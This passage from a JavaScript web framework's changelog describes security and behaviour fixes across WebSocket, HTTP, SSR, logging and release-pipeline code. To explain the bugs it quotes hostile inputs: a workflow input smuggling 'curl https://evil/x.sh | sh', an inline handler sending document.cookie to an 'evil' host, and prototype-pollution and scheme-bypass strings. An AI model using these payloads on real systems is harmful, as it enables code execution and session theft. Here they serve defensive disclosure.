- **A handler's reason phrase never reached the wire**: the adapter always called `writeHead`
  without it, so `new Response(body, { status: 418, statusText: 'I am a teapot' })` arrived with
  Node's default phrase.
- **A route pattern containing a percent escape was permanently unreachable.** Request paths are
  decoded per segment before matching but patterns never were, so `/my%20page` could only be
  reached by a double-encoded `/my%2520page` while sitting in the boot table looking served. It is
  now refused at registration, pointing at the decoded character. A bare `%` stays legal, because
  it is genuinely reachable.

### Security (release pipeline)

- **CRITICAL: expression injection in the npm publish workflow.** `.github/workflows/publish.yml`
  interpolated `${{ inputs.version }}` directly into a `run:` line, and Actions expands `${{ }}`
  TEXTUALLY into the shell script before bash parses it - inside the job holding
  `id-token: write`, the npm OIDC trusted-publishing identity for all fifteen packages. A dispatch
  input of `1.1.0 -y; curl -s https://evil/x.sh | sh; #` would execute with publish authority and
  could ship a malicious version carrying a VALID provenance attestation, which is the one thing
  provenance is supposed to make impossible. Trusted publishing means the reviewed workflow file
  is the only publish path, and this defeated that. The input now rides in through `env` and is
  referenced quoted, and a prior step rejects anything that is not a bare semantic version. The
  repository's own `release.yml` already used the safe pattern, so this was an inconsistency
  rather than an unknown.

### Security (WebSocket handshake and codec)

- **CRITICAL: cross-site WebSocket hijacking was the DEFAULT.** The origin check only ran when the
  application supplied a `verifyOrigin` callback, so out of the box any page on the internet could
  open an authenticated socket to a downstream app using the victim's cookies. WebSockets are
  exempt from CORS, so nothing else stopped it, and the natural way to authenticate an upgrade is
  to read `request.headers.cookie` - which means the app author does nothing wrong and still ships
  full session hijacking. On a trading platform that is order placement and balance exfiltration
  from any site the victim visits. The gate now always runs: with no callback, an Origin must name
  the same host and port the request was aimed at (parsed through `URL`, so IPv6 literals and
  implied ports hold), and anything else is refused 403. A request with NO Origin, which is what a
  non-browser client sends, stays allowed. The callback remains the override in both directions.
  This matches the default the `ws` npm package chose, but `@azerothjs/devtools` already wrote its
  own origin check, so the need was recognised one layer up and missed here.

- **CRITICAL: the frame parser was O(n^2), so an ordinary upload starved every other
  connection.** Every chunk allocated a new buffer and copied the whole retained one, and the
  chunk count is set by the network rather than the sender, so a plain 16 MiB frame cost 2 GiB of
  memcpy. Measured on the same input: 16 MiB arriving in 1400-byte segments went from **32,406 ms
  of blocked event loop to 32.9 ms**, and 8 MiB in 64 KiB reads from 173.5 ms to 15.5 ms. The
  parser now keeps a read/write window into a growable buffer, growth is clamped to the exact
  byte count the pending frame still needs (so a declared-but-unsent 16 MiB length cannot make it
  preallocate), the zero-copy single-chunk path is preserved, and it compacts only when the dead
  prefix outgrows half the capacity. A randomised-chunking test asserts any segmentation
  reassembles byte-identically to a single chunk.

- **A throw in the upgrade gate killed the process.** `verifyOrigin` and `onConnection` both run
  inside the server's `upgrade` listener, so a throw was an uncaught exception that took every
  other live socket with it - and the realistic trigger is mundane: an `onConnection` parsing a
  header, or a synchronous auth lookup failing because its backend is down. A throwing
  `verifyOrigin` now refuses with 500. A throwing `onConnection` cannot be a 500, because the 101
  is already on the wire by then, so that connection is closed with 1011 and its buffered replay
  skipped. `onMessage` and `onClose` throws were already contained, which is what made the gap
  easy to miss.

- **There was no connection cap.** Connections were tracked in an unbounded set, so combined with
  the per-connection parser buffer, 40 sockets held 641 MiB with no message ever completed: a
  slowloris that no available option could bound. `maxConnections` refuses past the cap with 503,
  checked before the origin gate and the handshake.

- **The server emitted illegal control frames.** The parser enforced the 125-byte control limit
  inbound while the serializer applied no check outbound, so a descriptive close reason (which
  routinely embeds user or peer input, making its length attacker-influenced) produced a frame a
  compliant peer MUST reject with 1002 - losing the application's close code entirely, so the
  client saw a protocol error instead of "order rejected". Codes were not validated either:
  `close(1006)` and `close(1005)` put codes on the wire that RFC 6455 section 7.4.1 says must
  never appear, and `close(70000)` silently aliased to 4464. Reasons are now truncated to 123
  bytes on a codepoint boundary, 1005 and 1006 map to an empty payload, an unsendable code is
  refused by the codec, and the serializer rejects an oversized control payload. `close()` itself
  stays total: it is a teardown path, so a forbidden code is normalised to 1000 rather than
  throwing, because a connection left open because its close code was wrong is the worse outcome.

- **The IANA close codes a gateway actually sends were rejected as protocol violations.** 1012
  (service restart), 1013 (try again later) and 1014 (bad gateway) all died with 1002, so a client
  could not distinguish "back off" from "you sent garbage" and would hot-retry into an already
  overloaded service. One predicate now serves both directions with the correct range.

- Conformance: a 64-bit length with the high bit set now closes with 1002 as the module's own
  header always claimed; `Upgrade` is parsed as the token list RFC 7230 defines, so
  `Upgrade: websocket, h2c` connects instead of being refused; and a `Host` header and HTTP/1.1 or
  later are required per RFC 6455 section 4.1.

### Security (WebSocket connection state)

- **CRITICAL: two remote memory-exhaustion kills, neither bounded by the documented cap.** The
  assembled-message limit counts BYTES, but RFC 6455 permits a zero-length fragment, so an endless
  stream of them adds nothing to the total while the fragment array grows forever: measured 34.9x
  wire-to-heap amplification, and 12 MB of traffic reaching a 512 MB heap ceiling with
  `maxMessage: 1024` explicitly set. One-byte fragments defeat it the same way, so raising the cap
  was no escape. Separately, every inbound ping was answered with an unconditional write and the
  read side was never paused, so a client that floods pings while refusing to read queued one
  userland write per ping: 13.7 MiB of pings grew the process to 751 MiB, while `bufferedAmount`
  under-reported it by two orders of magnitude because the per-write bookkeeping dominates, so an
  app watching that number saw nothing. Both are process kills, not dropped connections, so every
  other live socket dies with them. Fragments are now capped by count as well as size, and an
  automatic pong is dropped once the write queue is deep, which RFC 6455 section 5.5.3 explicitly
  permits.

- **Messages were delivered to `onMessage` AFTER `onClose` had already run.** The frame loop kept
  iterating a chunk after a close frame tore the connection down, so one TCP segment containing
  `[close][text]` ran the application's teardown and then handed it more messages. On an exchange
  that is an order executing against a released session; on a wallet it is a signing request
  processed after the auth context was dropped. The application could not defend against it,
  because the framework's own contract says `onClose` fires when the connection is over. The loop
  now stops at close, and `onMessage` is dropped alongside `onClose` with the data listener
  detached and the partial-assembly state released.

- **`drain()` never settled when the peer vanished**, because it waited only on the socket's
  `'drain'` event and a destroyed socket never emits one. That is the documented backpressure
  pattern (`if (!ws.send(x)) await ws.drain()`) meeting a slow consumer that then disconnects,
  which on a market feed is the most ordinary event there is: the producer loop was abandoned
  mid-iteration and its `finally` never ran, leaking whatever it held (a cursor, an advisory lock,
  a reserved sequence number) for the process lifetime. It now settles on close and error too.
  Against the old code the regression test does not fail fast, it hangs to the test timeout.

- **`pongTimeoutMs >= heartbeatMs` silently disabled half-open reclamation entirely.** The pong
  deadline was cleared and re-armed on every tick, so with a timeout at least as long as the
  interval the timeout branch was unreachable and a peer that vanished without a FIN was never
  terminated. `heartbeatMs: 30000, pongTimeoutMs: 30000` is a natural "give it a full interval to
  answer" choice, and it turned the one defence against half-open sockets into a no-op with no
  signal. A tick with a probe already outstanding now leaves the armed deadline alone.

- **A throwing `onError` escaped as an uncaught exception**, out of the very handler meant to
  contain failures, taking every other live connection with it. `onMessage` and `onClose` throws
  were already contained, which is what made the gap easy to miss. Every report now goes through
  one guarded path.

- **`maxPayload` was unreachable, so per-connection memory could not be bounded.** The parser
  enforced it but the socket constructed the parser without forwarding it, and the option was
  absent from `ServerSocketOptions`, so every connection was fixed at the 16 MiB default no matter
  what `maxMessage` said: an app setting `maxMessage: 1024` still let each socket pin a 16 MiB
  parser buffer, and 40 connections held 641 MiB with no message ever completed. It is now a real
  option, defaulting to `maxMessage`, enforced from the frame header before a byte is buffered.

### Security (renderer, router, reactivity)

- **A string-valued `on*` prop became a live inline event handler.** A prop counted as a handler
  only when its value was a FUNCTION; anything else fell through to `setAttribute`, so
  `onerror: "fetch('https://evil/?c='+document.cookie)"` was written as a live attribute. All
  three paths agreed and all three were wrong: the client DOM, the SSR serializer, and
  `bindProps`, which is what compiled `.azeroth` markup calls. The precondition is an app
  forwarding an untrusted object as props, which is an ordinary pattern rather than an abuse, and
  React refuses this case outright. Both paths now refuse it identically, reusing the policy the
  SSR serializer already applied to invalid attribute NAMES: fail loudly rather than emit it raw.
  The same gate closed the DOM path's missing name validation, so a hostile key in a data-driven
  attribute bag can no longer abort a render halfway and blank a page region.

- **SSR emitted `<script>` and `<style>` children verbatim, so the same component was inert
  client-rendered and live markup server-rendered.** Raw-text content is CDATA, but CDATA is
  closed by the element's own end tag and nothing neutralised it. The canonical JSON-LD pattern
  with a user-controlled product name injected into the served document. Only the
  element-terminating sequences are escaped, so legitimate content stays byte-identical.

- **The scoped-CSS registry was process-global, so one request's CSS was served to every later
  request and it grew without bound.** `collectStyleSheet()` returned every scope ever registered
  rather than the ones the current render touched, and nothing in the render path ever reset it.
  Two independent reviewers reproduced it and so did I: a `css` template interpolating an IBAN
  appeared in the next request's document, growing about 151 bytes per render and never releasing.
  String-mode `css()` calls are now recorded in a per-render frame that `collectStyleSheet()`
  drains, matching the seam pattern render mode and store scopes already use. Client behavior is
  unchanged.

- **The `css()` scope rewrite corrupted every asset URL.** A blanket regex over the whole
  stylesheet rewrote any `.identifier`, so `url(./logo.png)` became `url(./logo.png_<scope>)` and
  `content: ".done"` was altered - a silent 404 for every image and font referenced from scoped
  CSS, which survives review because the class names still work. The rewrite is now region-aware:
  quoted strings, `url(...)` bodies and comments are copied verbatim.

- **A throwing subscriber during a resource settle, and any `async` effect body that rejects,
  escaped as unhandled rejections that nothing could catch.** The settle chains had no terminal
  `.catch`, and `createEffect` discarded a returned promise entirely, so `catchError`,
  `<ErrorBoundary>` and `onUncaughtError` all saw nothing - and on Node an unhandled rejection
  terminates the process, making one malformed API payload a server crash the app could not
  defend against at the boundary the framework tells it to use. All three now route through the
  same last-resort path a synchronous effect error uses. `EffectFn` additionally declares
  `Promise<void>`, and its doc states the constraint the type cannot: an async body tracks only
  the reads that happen before the first `await`, and cannot register a cleanup.

- **Event delegation recomputed the propagation path DURING dispatch**, reading `parentNode` after
  each handler ran, while native dispatch computes the path first. So a handler that removed its
  own node truncated the walk and every ancestor handler was silently skipped, and a handler that
  REPARENTED its node delivered the event into a subtree that was never an ancestor. Delete and
  reorder buttons are ubiquitous, so close-the-dropdown, click-outside, audit and optimistic-list
  handlers stopped running with no error, and the reparent case acted on the wrong record. The
  ancestor chain is now snapshotted before the first handler runs. `stopImmediatePropagation()` is
  observed too, and the delegated-handler Symbols are cleared on `destroyComponent`.

- **`parseQuery` let the URL rewrite the returned object's prototype, and silently dropped a
  key.** `?__proto__=a&__proto__=b` (repeated, so the value is an array the prototype setter
  accepts) replaced the prototype of `location().query`, and a single `?__proto__=x` vanished
  entirely, so a query parameter could be made invisible to the app while still present in the URL
  and in any server-side log or signature check that parsed it correctly. The result is
  null-prototype now.

- **The URL scheme classifier and the click interception disagreed**, which is a bypass rather
  than a policy choice: the external-URL test allowed no whitespace, so `java\tscript:` was
  classified INTERNAL, intercepted, and pushed into history as an app path, while the browser
  strips those characters when resolving the rendered `href`. Control characters are now stripped
  before the test so the two paths cannot disagree. Note the absence of a `javascript:` allowlist
  is deliberate and matches React and React Router.

- Also: props are iterated own-keys-only, so a prototype-pollution gadget elsewhere can no longer
  inject attributes onto every element the renderer builds (React guards this path, so apps
  migrating from it were losing a defence); `hydrateIslands` uses `allSettled` with a per-anchor
  try/catch, so one malformed anchor no longer kills interactivity on the whole page, and an
  inherited registry key degrades to the documented no-loader warning instead of a crash; and
  `styleMap` rejects a property name from data and a value carrying `;` or `}` outside a quoted
  string or `url()` body.

### Security (devtools, schema, logger, cron)

- **BREAKING: the devtools server bridge now requires a token, and `attachDevtools(server)`
  becomes `attachDevtools(server, { token })`.** The bridge streams `exportSession()` on connect,
  which is a preview of every live signal and memo - and because a request on this framework IS a
  reactive root, that is per-request state. A reviewer's run over a plain socket with no
  credentials read a session token, an account record with IBAN and balance, and an admin key.
  Its entire perimeter was the `Origin` header, and the default check returned TRUE for a missing
  Origin, which is exactly what a non-browser client sends. The environment guard compared
  `NODE_ENV === 'production'` and therefore attached for unset, `""`, `Production`, `prod` and
  `staging`. It is now gated four ways, all of which must pass: a POSITIVE `NODE_ENV=development`
  check (so a misspelled or unset value refuses rather than opens), a shared token of at least 16
  characters compared in constant time, a loopback peer, and a present localhost `Origin`.
  `allowNonDevelopment` and `allowRemoteClients` are the explicit opt-outs. All four run before
  the handshake, so a refusal writes no session byte, and a caller-supplied `verifyOrigin` can no
  longer replace the token and peer checks. No inbound command surface was added: the bridge
  still never reads a frame.

- **A 1 MiB request body could cost 2.2 seconds of blocked event loop and a 148 MiB response.**
  The schema issue collector was unbounded in its default collect-everything mode, and each array
  element of an `object()` emits one issue PER DECLARED FIELD, so the canonical bulk shape
  `array(object({...}))` turned a body under the kernel's own default limit into 1.75 million
  issues, serialized into the 422 twice (as the issue list and as the field map). Issues are now
  capped at 100 with the result marked `truncated`, and the array, object and record loops stop
  once the ceiling is hit rather than walking the remaining elements. An ordinary handful of
  failures still reports every one. No default `array()` maximum was added: the cap makes it
  unnecessary, and silently rejecting a legitimate 2,000-element array would be a worse trade.

- **One logger throw killed the cron process, and the framework's own logger threw on ordinary
  values.** In the scheduler, `logger?.debug` ran synchronously inside a `setTimeout` callback
  (an uncaught exception), and the settle-handler log calls rejected the promise that `void
  run(job)` discarded - with the log line running BEFORE `report()`, so the `onError` observer
  never saw the failure it exists to report. Meanwhile the logger's serializer called bare
  `JSON.stringify`, which throws on a BigInt, a circular structure, a throwing getter, a throwing
  `toJSON`, or a throwing `.stack`: `log.info('paid', { amount: 10n })` threw in any app that
  keeps money in BigInt. Every logger call in the scheduler is now isolated exactly as the
  observer already was, `report()` runs first, and the serializer degrades to a marker instead of
  throwing. A payout worker no longer exits mid-cycle because a log line could not be written.

- **A cyclic error-shaped field OOM-killed the process through the pretty sink**, with no
  catchable exception, because the cause walk had no depth cap and concatenated a string per hop
  while `isErrorShape` accepted any object with `name`/`message`. The walk is now depth-bounded
  and cycle-aware.

- **Redaction missed the shape everyone actually logs.** It matched top-level keys only,
  case-sensitively, over own properties - while serialization emitted inherited keys too. So
  `Authorization` was not `authorization`, `{ headers: req.headers }` was stringified whole, and
  a secret on the fields object's prototype was written but never redacted, all while the module
  header promised "a redacted field never reaches ANY sink". Redaction is now case-folded,
  matches a bare name at any depth, supports dotted paths, is transparent through arrays,
  depth-capped and cycle-aware, and never mutates the application's own object. The serializer
  and the redactor now iterate one key set.

- **`object()` read INHERITED properties, turning any prototype pollution elsewhere into mass
  assignment through the validator.** With `Object.prototype.role = 'admin'` polluted by any
  other component, `object({ name, role, isAdmin }).parse(JSON.parse('{"name":"bob"}'))` returned
  `role: 'admin', isAdmin: true` as VALIDATED data - from the one layer an app trusts to make
  input safe, and which correctly strips unknown OWN keys. Field reads are own-property only now.

- **A validation error whose path collided with an `Object.prototype` member was erased or
  replaced by a function on the wire.** `__proto__` hit the prototype setter and vanished (the
  wire showed `Validation failed for 0 fields` with an empty map), while `constructor` kept the
  inherited function, which `JSON.stringify` then omitted. Any consumer treating the documented
  `FieldErrors` as `Record<string, string>` would crash on it. The map is null-prototype and
  written through `defineProperty`, and `record()` now strips an own `__proto__` key so a
  validated body is safe to `Object.assign` - it previously handed the handler a
  prototype-pollution primitive.

- **A calendar-impossible cron expression cost ~880 ms of `Intl` calls before failing**, so ten
  registrations stalled a boot for 8.5 seconds and any app exposing job registration turned one
  request into ~0.9 s of total unavailability. Impossible day and month pairs are now rejected
  arithmetically at parse time: the same seven expressions went from about 6 seconds to under
  200 ms, and the leap-day case still resolves correctly.

- Also: a throwing sink can no longer break the log call; the pretty face strips terminal control
  bytes from field values, the message, the error block and the request path, so a log line can
  no longer clear the operator's screen; `phone()` answers a non-string with a message instead of
  a TypeError, matching every sibling validator; `SchemaError.message` bounds and sanitizes
  attacker-supplied paths rather than repeating them in the framework's own `path: message`
  grammar; and the log directory and file are created 0700/0600 with `mode` options, so files
  that can contain bearer tokens are not world-readable.

### Security (http bodies, uploads, file serving, streaming)

- **A streaming response that failed mid-body killed the process, and every aborted compressed
  download leaked a file descriptor.** `compressResponse` used `.pipe()` rather than
  `pipeline()`: when the source errored, Node's pipe handler unpiped itself and re-emitted on a
  source with no listener, which is an unhandled `'error'` event and an immediate exit (confirmed
  at exit code 9; the identical server without compression survived). The same missing
  propagation meant a client disconnect destroyed only the zlib transform, never the
  `fs.ReadStream` behind the file. The trigger was routine rather than hostile: a database cursor
  dying halfway through a streamed report. One switch to `stream.pipeline` closes both
  directions.

- **`staticFiles` served `.env` and `.git` on Windows.** The dotfile guard ran on the REQUESTED
  path, but NTFS 8.3 aliases resolve on the filesystem, so `/assets/.env` correctly 404'd while
  `/assets/ENV~1` returned the file, case-insensitively and through percent-encoding. The
  containment check already called `realpath`, but only to compare a prefix. The dotfile rule is
  now applied to the RESOLVED path.

- **A lone carriage return in an SSE payload forged arbitrary events, including the event name.**
  The framer split on `\n` only, but the event-stream grammar also terminates a line on a bare
  CR, so everything after one parsed as fresh fields. Verified in real Chromium: a single
  `send()` of user text produced a forged `transfer` event with an attacker-chosen payload.
  `event:`, `id:` and `comment()` were not sanitized at all and are now single-line by
  construction.

- **Reading the body twice hung the request forever, and only in production.** The adapter's fast
  lane attached `'end'` to an already-drained stream, so the promise never settled - and because
  the body had been fully received the request timeout was already cleared and nothing reclaimed
  the socket. One wedged connection and one leaked request root per attempt, unbounded. It was
  invisible in tests because the portable path throws a locked-stream error instead, so the shape
  that matters (an HMAC guard reading the raw body, then the handler reading it again) failed
  only on the Node adapter. Both lanes now fail identically and loudly, an abort settles the
  read, and `bodyUsed` tells the truth after a fast-lane read.

- **`sse()` leaked its producer, heartbeat and request root when the client was already gone.**
  It registered an abort listener without checking `signal.aborted` first, and a listener added
  to an already-aborted signal never fires, so a disconnect during setup left the 15s heartbeat
  armed and the producer pending forever. Measured 13 heartbeats produced after the client left,
  with zero teardowns.

- **An SSE producer failure was reported to the client as SUCCESS.** The catch discarded the
  error and called `close()`, which emits the `[DONE]` terminator, so a ledger or price stream
  that died after page one was consumed as complete and the operator got no signal at all. The
  stream now ends WITHOUT the terminator and the error is reported through a new `onError`, or
  rethrown so the runtime sees it.

- **`maxFileSize` was bypassable, and binary uploads were silently corrupted, via `filename*=`.**
  Part classification matched only `filename=`, so the RFC 8187 form was treated as a text field:
  exempt from the per-file cap (a 300 KB part passed a 1 KB limit) and UTF-8 decoded rather than
  preserved (`89504e47fffe0001` came back as `efbfbd504e47efbfbdefbfbd0001`), which is exactly
  the mangling the module documents itself as avoiding. The inverse also worked: a `;` inside a
  quoted `name` forged a filename. Parameters are now scanned outside quoted strings only, and
  `filename*` is decoded and takes precedence.

- **A hostile multipart boundary made the parser quadratic.** The client picks both the boundary
  and the bytes, and the buffered parser searched with no skip heuristic and an un-prefixed
  delimiter, so 63 ms of blocked event loop per MiB (14x a benign boundary) ran BEFORE any
  part-count limit. The buffered path now uses the same CRLF-prefixed delimiter the streaming
  path always did: 1 MiB of dashes went from 41.5 ms hostile / 2.0 ms benign to 0.9 / 0.8.

- **Compression ignored `q=0`, so responses were encoded with codings the client had explicitly
  refused** (`br;q=0, gzip` was served br). Weights are now parsed, `q=0` is a refusal, and the
  heaviest weight wins. `Cache-Control: no-transform` is honoured, and a compressed response
  carries its own ETag so a cache can no longer serve gzip bytes as identity - with the
  conditional path accepting an encoding-suffixed validator only while the client still accepts
  that coding, so revalidation still answers 304.

- **`staticFiles` advertised `Last-Modified` and ignored `If-Modified-Since`**, so every
  conforming cache, CDN and `curl -z` got a full retransmission. It is now honoured, with
  `If-None-Match` keeping precedence.

### Security (http middleware)

- **A throwing CORS origin predicate or rate-limit store took the process down.** The idiomatic
  subdomain allowlist is `origin: (o) => new URL(o).hostname.endsWith('.example.com')`, and
  browsers themselves send the literal `Origin: null` for sandboxed iframes, so one curl was an
  unauthenticated kill. A predicate throw is now a denial, and a store outage or throwing key
  fails CLOSED to a 429 rather than a rejection.

- **`cors({ origin: true, credentials: true })` reflected any origin, including `null`, with
  credentials.** The guard against `*`-with-credentials existed but DOWNGRADED to reflecting the
  caller's Origin while still sending `Access-Control-Allow-Credentials: true`, which is strictly
  worse: browsers block the former and honour the latter. Any website could read an authenticated
  response. That combination now throws at wiring time, and the scaffolded backend template names
  an explicit dev origin instead.

- **`serializeCookie` interpolated `path` and `domain` raw**, despite documenting that it
  validates attribute values. Since duplicate cookie attributes are last-wins, a tenant-derived
  path could widen a session cookie across every sibling subdomain, and a CRLF in one killed the
  process through `writeHead`. Both are now validated against their RFC 6265 grammars, and a
  non-finite `maxAge` no longer emits `Max-Age=NaN`.

- **The rate limiter was decorative in every real deployment.** Its default key is the TCP peer,
  so behind any proxy every client shared ONE bucket and the configured limit became a global
  budget: 100 requests per minute locked out the whole service. `trustProxy` fixed only a
  single-proxy chain because `trustedHops` was never forwarded and was absent from the options.
  And the key used the full IPv6 /128, so one VPS with a routed /64 had 2^64 free buckets and
  never tripped the limiter at all, with nothing spoofed. `trustedHops` is now forwarded, keys
  bucket IPv6 to a configurable prefix (default /64) via the new `ipBucket`, and a runtime with
  no client identity refuses loudly instead of silently sharing one bucket.

- **The limiter's own memory was unbounded**: it swept on a fixed 60s interval regardless of
  `windowMs`, had no entry cap, and accepted an attacker-sized key. The sweep now tracks the
  window, the map has a capacity with oldest-key eviction, and keys are bounded.

- **CORS preflights bypassed the limiter entirely** in the middleware order the framework itself
  scaffolds, giving an unmetered request channel. Preflights now delegate through the inner
  handler and carry its `RateLimit-*` headers.

- **Preflight reflected `Access-Control-Request-Headers` verbatim**, approving Authorization and
  any CSRF header the caller named, which removed the last mitigation once an origin check was
  permissive. The default is now the CORS safelist plus Content-Type.

- **`securityHeaders()` silently overwrote a handler's stricter header**, so a route hardened with
  `X-Frame-Options: DENY` was downgraded to the global `SAMEORIGIN`. A baseline value now yields
  to a header the response already carries, while an explicitly configured value still wins.

- **HSTS was emitted over plaintext on the client's word**, contradicting the module's own stated
  guarantee, by reading `X-Forwarded-Proto` with no trust gate - the same header the adapter
  refuses to believe without `trustProxy`. It is now gated by an explicit option, and the
  pre-existing test that asserted the vulnerable behavior has been corrected.

- **`logRequests` emitted NO record when `Host` was malformed.** It built a URL to get the path,
  which throws on an authority the router never parses, and observer throws are swallowed by
  design - so a request was fully served with no audit line at all. It now uses the kernel's own
  string scan.

- **`prettySink` could be line-forged**: string fields and the message were interpolated raw
  while non-strings went through `JSON.stringify`, so a newline in a user-supplied field wrote a
  second line indistinguishable from a real record. Control characters are now escaped.

- **`loadConfig` printed a `secret: true` variable's raw value in the boot error**, straight to
  stderr and CI logs, because the redaction covered the object's serializations but not the
  failure path. It now names the variable without echoing the value, and `flag`/`oneOf` accept
  `secret` too.

- **`parseCookies` dropped any cookie named after an `Object.prototype` member** (`toString`,
  `constructor`) because membership was tested with `in` on a plain object, returning the
  inherited function. The record is null-prototype now.

### Security (contract layer)

- **A guard key that addressed no route was silent, leaving those routes unguarded.** `mountApi`
  enforced handler coverage at boot and had no equivalent check for guards, and the type could
  not catch it either: `Guards` is inferred from the map literal, so TypeScript's
  excess-property check only fires when NO key is valid, and every real map has a valid key
  (usually `'*'`). A renamed group, or a wildcard written for an absolute path and then mounted
  as a subtree, therefore produced an unauthenticated endpoint with no compile error, no boot
  error and no log line - and because a pure gate (auth, CSRF, rate limit) adds nothing to the
  context, no handler type changed either. An unmatched guard key now throws at mount, naming
  the key and listing the known routes. The doc comment that claimed the type caught this has
  been corrected to describe what the code actually guarantees.

- **Three prototype-shadowing lookups in the mount are own-property only.** A route keyed
  `toString` crashed the mount with an opaque spread error, and a query or multipart field named
  `constructor` was silently replaced by the inherited function and 422'd the route forever.

### Changed (schema)

- **Schema composition is object composition; no `extend`/`pick`/`omit` was added.** An input
  schema and the stored shape it grows into share fields, and the obvious fix was three new
  combinators. They are not needed: `object()` takes a plain literal, so keeping the FIELDS as
  the reusable value lets `{ ...entryFields, id: number() }` extend, destructuring omit, and
  selection pick - with exact inference and the constraints carried along, which a typecheck
  now pins. Three functions that re-express what the language already does would have been
  surface to learn, document, and keep working for nothing. The fullstack template shows the
  pattern instead of repeating `name` and `message` across its two schemas.

### Fixed (schema)

- **`phone()` accepted a malformed number built from the `00` international prefix.** With a
  default country, `00989170459330` was normalised by stripping a single leading zero and
  prepending the calling code, producing `+980989170459330` - fifteen digits beginning with
  the Iranian calling code, so it passed both the digit-count bound and the country filter.
  A silently accepted wrong number is worse than a rejected right one: `00` is now read as
  the international call prefix before national normalisation runs, so `00989170459330` and
  `+989170459330` are the same number, and `0014155551234` is correctly judged as `+1`.

### Added (compiler)

- **`azeroth/markup-indent` lints the indentation of markup tags.** ESLint's own `indent`
  cannot: the ESLint plugin lints the PROJECTION, whose whitespace the compiler re-flows, so
  a report there would name a column the author never wrote - which is why the whole layout
  rule family is off on `.azeroth`. This rule reads the original source instead, so its
  positions and its fix are the author's own text. It judges each element as a WHOLE - the
  opening tag, every attribute that starts a line, the `>` that closes a wrapped tag, and the
  closing tag - because moving the opening tag alone is how an indentation autofix leaves a
  file worse than it found it. Expression holes are skipped entirely (their contents are
  TypeScript) and so is text, and only lines a tag OPENS are judged, so `<b>a</b><i>b</i>` on
  one line stays an authoring choice. Configure it with the `markupIndent` plugin option
  (spaces per level, `0` disables, default `4`); the ESLint processor reports it as
  `azeroth/markup-indent` and `eslint --fix` applies it. Measured against every `.azeroth`
  file in the repo and a real production app before it was allowed near a fix: zero false
  positives, and it found one genuine defect.

### Fixed (compiler)

- **A `deferred` or a wrapper block inside a module-level composable compiled to invalid
  JavaScript.** Module-scope regions are pre-filtered for a keyword before the nested lowerer
  runs, so keyword-free code stays byte-identical and keeps a clean source map - but that
  filter hand-listed `state|derived|effect`, three of the ten words that can start a lowerable
  construct. A `deferred slow = heavy;` or a `cleanup { ... }` in a composable therefore fell
  through and was emitted VERBATIM, which is not valid JavaScript. The projection lowered the
  same code correctly, so the editor and `azeroth check` were green and the failure only
  appeared when the bundle ran. The filter is now derived from the keyword table
  (`LOWERABLE_WORDS`), so a keyword is covered by declaring it there. The factories and `form`
  stay out of it deliberately: the nested lowerer does not transform them, and listing them
  would cost the verbatim mapping of any module that uses `form` or `store` as a plain name.

### Changed (http)

- **Handlers are keyed by the contract's DOTTED ROUTE PATH; the nested handler tree is gone.**
  BREAKING. One route had two addressing schemes: guards were always dotted (`'admin.orders'`,
  `'admin.*'`), while handlers were a nested object that had to mirror the contract's shape. The
  nesting bought nothing at runtime - the mount already computed the dotted path one line above
  the handler lookup, to resolve guards - and it cost a feature its independence: to be spread
  into the mount it had to be wrapped at exactly the depth it lands, so a feature file knew which
  group it belonged to and moving a service under a new prefix edited every feature. Now
  `handlers: { 'guestbook.sign': ... }` shares the guards' key space, assembling features is a
  plain spread with no wrapper, and a key that is not a route path is a compile error rather than
  a silently ignored entry. To migrate, flatten each nesting level into a dotted key.

- **`@azerothjs/http/api/client` is now `@azerothjs/http/api/shared`.** BREAKING, and the old
  specifier is gone rather than aliased. A contract is ONE declaration both halves read, but a
  contract file had to import `defineContract` from a path named `client` - which reads as
  "contracts are a client-side thing", the exact opposite of what they are. The subpath never
  meant "the client's half"; it meant "the half that is safe to put in a browser bundle", and
  the name taught the wrong model to at least one reader. `shared` says what it is. The
  boundary itself is unchanged and still statically proven: the entry cannot reach `mountApi`,
  `guard`, or anything Node, so importing it can never drag the server into a bundle. To
  migrate, replace the specifier; nothing else moves. Note for whoever cuts the release: the
  fullstack template now imports the new specifier, so a scaffolded app only resolves once this
  version is on the registry - templates pin the version they ship beside, and until then a
  local scaffold must point its `@azerothjs/*` deps at the workspace.

### Added (http)

- **`group(prefix, routes)` writes a service's base path once.** In a real 17-route app, 14 routes
  restated `/admin` and 3 restated `/pay`, which is a rename waiting to go half-finished. `group`
  prepends the prefix to every route it wraps, including nested groups. Paths stay EXPLICIT
  strings rather than being derived from key names, because a key and its path legitimately differ
  - `signIn` answers `/session` - and a framework that guessed would be wrong exactly where it
  matters.

- **`merge(...groups)` refuses to lose a route.** Combining feature groups was an object spread,
  which is last-wins: two features that happened to pick the same key dropped one of the routes
  out of the API with nothing failing anywhere, and the router's own duplicate check only fires if
  the two also share a method and a path. `merge` throws on a duplicate key, naming it, at module
  load - so the failure is at boot in every environment rather than a 404 in production.

- **`only()` makes a group guard usable: guard the wildcard, name the exceptions.** Guarding an
  admin console meant listing every route by hand - twelve `'admin.x': [requireAdmin]` lines -
  purely so the one route that must NOT be guarded (signing in, which is how you get past the
  guard) could be left out. That is backwards: the default was unguarded, and a route added
  later was silently public. `'admin.*': [requireAdmin]` now covers the group, and
  `'admin.signIn': only([...])` declares a complete chain that replaces everything it would
  otherwise inherit. The opt-out is EXACT-PATH only, because a wildcard cancelling another
  wildcard would make a route's real chain depend on declaration order. Crucially it resets the
  TYPE as well as the runtime chain: an opted-out handler cannot read a field no guard attached,
  which would otherwise be an `undefined` behind a property TypeScript promised was there.

- **`implement()` lets a feature type its handlers from its own routes.** A feature owning part
  of a larger contract had to describe its handlers by reaching for the assembled tree and
  narrowing it - `Pick<HandlersWithGuards<typeof contract, Record<never, never>>['admin'],
  'signIn' | 'overview' | ...>` - which imports the whole contract to say something local,
  names every route a third time, and hardcodes the guard additions as "none". The observable
  cost was that handlers went back to hand-annotating their own context, which is exactly the
  work the derived types exist to do. `implement(routes, handlers)` is identity at runtime and
  types the handlers against that group alone, with the guards' additions as an optional second
  type argument, so a feature file needs no reference to the contract it joins and a missing,
  extra, or wrongly-typed handler is a compile error at the feature rather than at the mount.

### Fixed (http)

- **`route()` let a GET declare a request body.** The six verb helpers cover every
  `ApiMethod`, and `get`/`del` take a definition type with no `input` field - but `route`,
  the primitive they are built on, accepted `{ method: 'GET', input }` and produced a
  contract whose client would send a body no GET should carry. Its definition type is now
  conditional on the method, so a literal bodyless method narrows exactly as the helper does
  while a widened `ApiMethod` still type-checks - which is the one thing `route` is for, and
  why it stays: assembling a contract from configuration, where the method is not a literal.
